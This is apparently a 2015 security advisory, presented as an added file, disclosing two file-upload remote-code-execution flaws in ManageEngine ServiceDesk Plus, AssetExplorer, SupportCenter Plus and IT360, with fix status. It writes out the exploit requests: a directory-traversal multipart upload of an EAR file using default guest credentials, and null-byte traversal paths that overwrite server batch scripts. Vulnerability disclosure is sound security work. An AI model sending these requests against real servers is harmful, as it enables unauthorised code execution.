@@ -1,0 +1,63 @@
+>> Remote code execution / file upload in ManageEngine ServiceDesk Plus, AssetExplorer, SupportCenter Plus and IT360
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+==========================================================================
+Disclosure: 04/01/2015 / Last updated: 04/01/2015
+
+>> Background on the affected products:
+"ServiceDesk Plus is a help desk software with integrated asset and project management built on the ITIL framework. It is available in 29 different languages and is used by more than 85,000 companies, across 186 countries, to manage their IT help desk and assets."
+
+"SupportCenter Plus is a web-based customer support software that lets organizations effectively manage customer tickets, their account & contact information, the service contracts and in the process providing a superior customer experience."
+
+"ManageEngine AssetExplorer is a web-based IT Asset Management (ITAM) software that helps you monitor and manage assets in your network from Planning phase to Disposal phase. AssetExplorer provides you with a number of ways to ensure discovery of all the assets in your network."
+
+"Managing mission critical business applications is now made easy through ManageEngine IT360. With agentless monitoring methodology, monitor your applications, servers and databases with ease. Agentless monitoring of your business applications enables you high ROI and low TOC. With integrated network monitoring and bandwidth utilization, quickly troubleshoot any performance related issue with your network and assign issues automatically with ITIL based ServiceDesk integration."
+
+
+>> Technical details:
+#1
+Vulnerability: Remote code execution via file upload and directory traversal (authenticated)
+CVE-2014-5301
+Constraints: user login needed, but exploitable with the default low privilege guest account (u:guest/p:guest)
+Affected versions (inclusive): ServiceDesk Plus / Plus MSP v5 to v9.0 v9030; AssetExplorer v4 to v6.1; SupportCenter v5 to v7.9; IT360 v8 to v10.4
+
+POST /common/FileAttachment.jsp
+POST /workorder/Attachment.jsp (older versions < v7 build 7016; AssetExplorer v4; all SupportCenter versions)
+
+It is possible to abuse a directory traversal vulnerability when uploading attachments. A Metasploit module that exploits this vulnerability has been released.
+Post data has to be formatted as a multi-part request with an embedded ear file. Below is the form data for the newer versions:
+
+Content-Type: multipart/form-data; boundary=---------------------------9313517619947
+Content-Length: 1337
+
+-----------------------------9313517619947
+Content-Disposition: form-data; name="module"
+
+../../server/default/deploy
+-----------------------------9313517619947
+Content-Disposition: form-data; name="filePath"; filename="whatever.ear"
+Content-Type: application/octet-stream
+
+<...EAR file here...>
+
+-----------------------------9313517619947
+Content-Disposition: form-data; name="att_desc"
+
+
+-----------------------------9313517619947--
+
+
+#2
+Vulnerability: Remote code execution via file upload (unauthenticated)
+CVE-2014-5302
+Constraints: no authentication or any other information needed except for IT360 (guest account needed); code execution is only possible by replacing one of the <install_dir>bin/ scripts and waiting for them to be executed or for a periodic task to run. This is because only text files can be uploaded as binary files are mangled; and there no JSP compiler in the $PATH.
+Affected versions: ServiceDesk Plus / Plus MSP v7.6 to v9.0 build 9026; AssetExplorer v? to v6.1 build 6106; IT360 v? to v10.4
+
+POST /discoveryServlet/WsDiscoveryServlet?computerName=../bin/run.bat%00
+POST /discoveryServlet/WsDiscoveryServlet?computerName=../bin/backUpData.bat%00
+<...text file / script payload here...>
+
+
+>> Fix:
+#1 is fixed on ServiceDesk Plus 9.0 build 9031. It is UNFIXED on all other products. Disclosure to ManageEngine was done on 04/08/2014, so over 150 days have elapsed. The last communication I received from them was that "Once we released this fix in ServiceDesk plus, we eventually take this in other products like AssetExplorer and SupportCenter."
+
+#2 is fixed on ServiceDesk Plus 9.0 build 9027 and on AssetExplorer 6.1 build 6107. It is UNFIXED for IT360.
